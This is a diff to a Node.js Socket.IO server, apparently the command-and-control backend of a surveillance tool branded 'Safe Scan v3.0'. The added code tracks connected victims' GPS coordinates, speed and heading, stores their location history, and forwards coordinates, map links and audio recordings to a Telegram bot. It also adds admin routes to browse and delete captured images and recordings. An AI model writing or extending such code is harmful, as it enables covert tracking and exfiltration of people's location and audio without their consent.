@@ -204,9 +204,10 @@ let db = {
     password: bcrypt.hashSync('admin123', 10),
     name: 'Admin'
   },
-  users: [],      // { uuid, country, browser, device_type, ip, is_online, created_at, last_active }
+  users: [],      // { uuid, country, browser, device_type, ip, is_online, created_at, last_active, location }
   captures: [],   // { id, uuid, file_path, file_size, created_at }
-  recordings: []  // { id, uuid, file_path, duration, file_size, mime_type, created_at }
+  recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
+  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -228,9 +229,10 @@ function loadData() {
       db.users = saved.users || [];
       db.captures = saved.captures || [];
       db.recordings = saved.recordings || [];
+      db.locations = saved.locations || [];
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
-      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings`);
+      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
     }
   } catch (e) {
     console.log('📂 Starting with fresh database');
@@ -242,7 +244,8 @@ function saveData() {
     fs.writeFileSync(DATA_FILE, JSON.stringify({
       users: db.users,
       captures: db.captures,
-      recordings: db.recordings
+      recordings: db.recordings,
+      locations: db.locations
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -408,6 +411,87 @@ app.get('/api/recordings/:id/stream', (req, res) => {
   fs.createReadStream(filePath).pipe(res);
 });
 
+// ─── Location Routes ─────────────────────────────────────────────
+app.get('/api/locations', authCheck, (req, res) => {
+  const userLocations = db.users
+    .filter(u => u.location)
+    .map(u => ({
+      uuid: u.uuid,
+      device_type: u.device_type,
+      browser: u.browser,
+      is_online: u.is_online,
+      ...u.location
+    }));
+  res.json({ locations: userLocations });
+});
+
+app.get('/api/locations/:uuid', authCheck, (req, res) => {
+  const uuid = req.params.uuid;
+  const history = db.locations.filter(l => l.uuid === uuid);
+  res.json({ locations: history });
+});
+
+// ─── File Browser Route ──────────────────────────────────────────
+app.get('/api/files', authCheck, (req, res) => {
+  const uuid = req.query.uuid;
+  let captures = uuid ? db.captures.filter(c => c.uuid === uuid) : [...db.captures];
+  let recordings = uuid ? db.recordings.filter(r => r.uuid === uuid) : [...db.recordings];
+  captures.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  recordings.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  const files = [
+    ...captures.map(c => ({ ...c, type: 'capture', url: '/media/' + c.file_path })),
+    ...recordings.map(r => ({ ...r, type: 'recording', url: '/media/' + r.file_path }))
+  ];
+  files.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+  res.json({ files });
+});
+
+// ─── Recording Management Routes ────────────────────────────────
+app.delete('/api/recordings/:id', authCheck, (req, res) => {
+  const id = parseInt(req.params.id);
+  const rec = db.recordings.find(r => r.id === id);
+  if (!rec) return res.status(404).json({ error: 'Recording not found' });
+  const filePath = path.join(MEDIA_DIR, rec.file_path);
+  try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
+  db.recordings = db.recordings.filter(r => r.id !== id);
+  saveData();
+  addLog('delete', rec.uuid, 'Recording deleted: ' + rec.file_path);
+  emitStats();
+  res.json({ message: 'Recording deleted' });
+});
+
+app.post('/api/recordings/batch-delete', authCheck, (req, res) => {
+  const { ids } = req.body;
+  if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids array required' });
+  let deleted = 0;
+  ids.forEach(id => {
+    const rec = db.recordings.find(r => r.id === id);
+    if (rec) {
+      const filePath = path.join(MEDIA_DIR, rec.file_path);
+      try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
+      deleted++;
+    }
+  });
+  db.recordings = db.recordings.filter(r => !ids.includes(r.id));
+  saveData();
+  addLog('delete', '', `Batch deleted ${deleted} recordings`);
+  emitStats();
+  res.json({ message: `${deleted} recordings deleted` });
+});
+
+app.delete('/api/captures/:id', authCheck, (req, res) => {
+  const id = parseInt(req.params.id);
+  const cap = db.captures.find(c => c.id === id);
+  if (!cap) return res.status(404).json({ error: 'Capture not found' });
+  const filePath = path.join(MEDIA_DIR, cap.file_path);
+  try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch(e) {}
+  db.captures = db.captures.filter(c => c.id !== id);
+  saveData();
+  addLog('delete', cap.uuid, 'Capture deleted: ' + cap.file_path);
+  emitStats();
+  res.json({ message: 'Capture deleted' });
+});
+
 // ─── Activity Log Route ──────────────────────────────────────────
 app.get('/api/activity-log', authCheck, (req, res) => {
   const limit = parseInt(req.query.limit) || 100;
@@ -530,9 +614,23 @@ io.on('connection', (socket) => {
         db.users.push(user);
       }
 
+      // Store location from registration if provided
+      if (data.location && data.location.latitude) {
+        user.location = {
+          latitude: data.location.latitude,
+          longitude: data.location.longitude,
+          accuracy: data.location.accuracy || null,
+          altitude: data.location.altitude || null,
+          speed: data.location.speed || null,
+          heading: data.location.heading || null,
+          timestamp: new Date().toISOString()
+        };
+      }
+
       console.log(`📱 User connected: ${userUUID} (${data.device_type || 'Unknown'})`);
 
-      const connectMsg = `🟢 User Connected\n\nUUID: ${userUUID}\nDevice: ${data.device_type || 'Unknown'}\nBrowser: ${data.browser || 'Unknown'}\nTimezone: ${data.country || 'Unknown'}\nIP: ${socket.handshake.address || 'Unknown'}\n\n${new Date().toLocaleString()}`;
+      const locStr = user.location ? `\nLocation: ${user.location.latitude.toFixed(6)}, ${user.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}` : '';
+      const connectMsg = `🟢 User Connected\n\nUUID: ${userUUID}\nDevice: ${data.device_type || 'Unknown'}\nBrowser: ${data.browser || 'Unknown'}\nTimezone: ${data.country || 'Unknown'}\nIP: ${socket.handshake.address || 'Unknown'}${locStr}\n\n${new Date().toLocaleString()}`;
       sendTextToTelegram(connectMsg);
       addLog('user_connect', userUUID, 'User connected: ' + (data.device_type || 'Unknown') + ' / ' + (data.browser || 'Unknown'));
 
@@ -647,14 +745,53 @@ io.on('connection', (socket) => {
 
         console.log(`🎤 Recording saved: ${fileName} (${data.duration || 0}s)`);
 
-        // Send to Telegram
-        const audioCaption = `🎤 Audio Recording\nUser: ${uuid}\nDuration: ${data.duration || 0}s\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
+        // Send to Telegram with enhanced info
+        const recUser = db.users.find(u => u.uuid === uuid);
+        const recLocStr = recUser?.location ? `\nLocation: ${recUser.location.latitude.toFixed(6)}, ${recUser.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${recUser.location.latitude},${recUser.location.longitude}` : '';
+        const audioCaption = `🎤 Audio Recording\nUser: ${uuid}\nDevice: ${recUser?.device_type || 'Unknown'}\nBrowser: ${recUser?.browser || 'Unknown'}\nDuration: ${data.duration || 0}s${recLocStr}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
         sendAudioToTelegram(buffer, audioCaption, data.mimeType);
         addLog('recording', uuid, 'Audio recording saved (' + (data.duration || 0) + 's)');
 
         emitStats();
       } catch (e) {
         console.error('Audio recording error:', e.message);
+      }
+    });
+
+    // Handle location updates from mobile users
+    socket.on('location:update', (data) => {
+      if (!data || !data.uuid) return;
+      const uuid = data.uuid;
+      const locationData = {
+        uuid,
+        latitude: data.latitude,
+        longitude: data.longitude,
+        accuracy: data.accuracy || null,
+        altitude: data.altitude || null,
+        speed: data.speed || null,
+        heading: data.heading || null,
+        timestamp: new Date().toISOString()
+      };
+
+      const user = db.users.find(u => u.uuid === uuid);
+      if (user) {
+        user.location = locationData;
+        user.last_active = new Date().toISOString();
+      }
+
+      db.locations.push(locationData);
+      if (db.locations.length > 1000) db.locations = db.locations.slice(-1000);
+
+      io.to('admin').emit('location:update', locationData);
+
+      // Throttle Telegram: only send if last location msg was > 5 mins ago
+      const lastLocMsg = user?._lastLocTelegram || 0;
+      if (Date.now() - lastLocMsg > 5 * 60 * 1000) {
+        if (user) user._lastLocTelegram = Date.now();
+        const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+        const locMsg = `📍 Location Update\n\nUUID: ${uuid}\nCoordinates: ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}\nAccuracy: ${data.accuracy ? data.accuracy.toFixed(0) + 'm' : 'N/A'}\nAltitude: ${data.altitude ? data.altitude.toFixed(1) + 'm' : 'N/A'}\nSpeed: ${data.speed ? data.speed.toFixed(1) + ' m/s' : 'N/A'}\n\n🗺️ Map: ${mapsLink}\n\n${new Date().toLocaleString()}`;
+        sendTextToTelegram(locMsg);
+        addLog('location', uuid, `Location: ${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)}`);
       }
     });
 
@@ -669,7 +806,8 @@ io.on('connection', (socket) => {
         io.to('admin').emit('user:disconnected', { uuid: userUUID });
         console.log(`📱 User disconnected: ${userUUID}`);
 
-        const disconnectMsg = `🔴 User Disconnected\n\nUUID: ${userUUID}\n\n${new Date().toLocaleString()}`;
+        const discLocStr = user?.location ? `\nLast Location: ${user.location.latitude.toFixed(6)}, ${user.location.longitude.toFixed(6)}\n🗺️ Map: https://www.google.com/maps?q=${user.location.latitude},${user.location.longitude}` : '';
+        const disconnectMsg = `🔴 User Disconnected\n\nUUID: ${userUUID}${discLocStr}\n\n${new Date().toLocaleString()}`;
         sendTextToTelegram(disconnectMsg);
         addLog('user_disconnect', userUUID, 'User disconnected');
 
